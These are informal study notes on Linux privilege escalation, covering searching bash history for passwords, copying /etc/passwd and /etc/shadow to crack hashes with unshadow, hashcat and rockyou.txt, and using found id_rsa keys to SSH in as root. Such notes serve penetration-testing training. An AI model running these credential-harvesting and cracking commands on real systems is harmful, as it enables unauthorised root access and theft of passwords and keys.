1)ESCALLATION VIA STORED PASSWORDS:--
--------------------------------------------
-->history   --->check for any usernames or passwords
-->history | grep pass
-->cat bash_history -------------> sometimes bash_history  will be hidden check ls -la and see if it is hidden cat .bash_history to check the file

Linpeas ---------Run Automation Tool To Find Passwords




2)ESCALLATION VIA WEAK FILE PERMISSIONS:--
-------------------------------------------
-->ls -la /etc/passwd  -----we should only have read access to this file and should not have write access to this file
-->ls -la /etc/shadow  ----- we should not have read or write access to this file
-->copy the contents of /etc/passwd and create a file in your local machine and paste into that file(ex:passwd file)
-->copy the contents of /etc/shadow and create a file in your local machine and paste into that file(ex:shadow file)
-->now use unshadow(/usr/sbin/unshadow) passwdfile shadowfile
-->unshadow will replace the x in passwd file with hash in shadow file 
-->copy the content after unshadow and paste into a file (ex: unshadow file)

-->now we have to check which type of hash it is 
                         --->https://hashcat.net/wiki/doku.php?id=example_hashes
                         --->go to the website copy the first three letters of the hash(ex:$6$) and ctrl+f in the website and find which type of hash it is using
                         
-->download rockyou.txt file from google
-->hashcat -m 1800 unshadow.txt rockyou.txt -O



3)ESCALATION VIA SSH KEYS:--
----------------------------------------
-->payload All the things----->Looting Passwords --->RSA keys
-->find / -name authorized_keys 2>/dev/null
-->find / -name id_rsa 2>/dev/null   ------>copy the private key into a file in local machine
-->chmod 600 filename
-->ssh -i file root@ipaddress
